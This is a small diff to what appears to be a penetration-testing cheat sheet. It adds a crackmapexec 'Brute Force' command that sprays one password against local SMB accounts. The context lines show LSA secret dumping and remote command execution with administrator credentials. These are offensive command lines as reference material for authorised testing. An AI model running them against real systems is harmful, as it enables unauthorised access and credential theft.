@@ -146,6 +146,9 @@ crackmapexec smb 10.10.10.10 -u administrator -p password --lsa
 # Command Execution
 crackmapexec smb 10.10.10.10 -u administrator -p password -x "whoami"
 
+# Brute Force
+crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+
 ```
 
 # 4. Smbmap
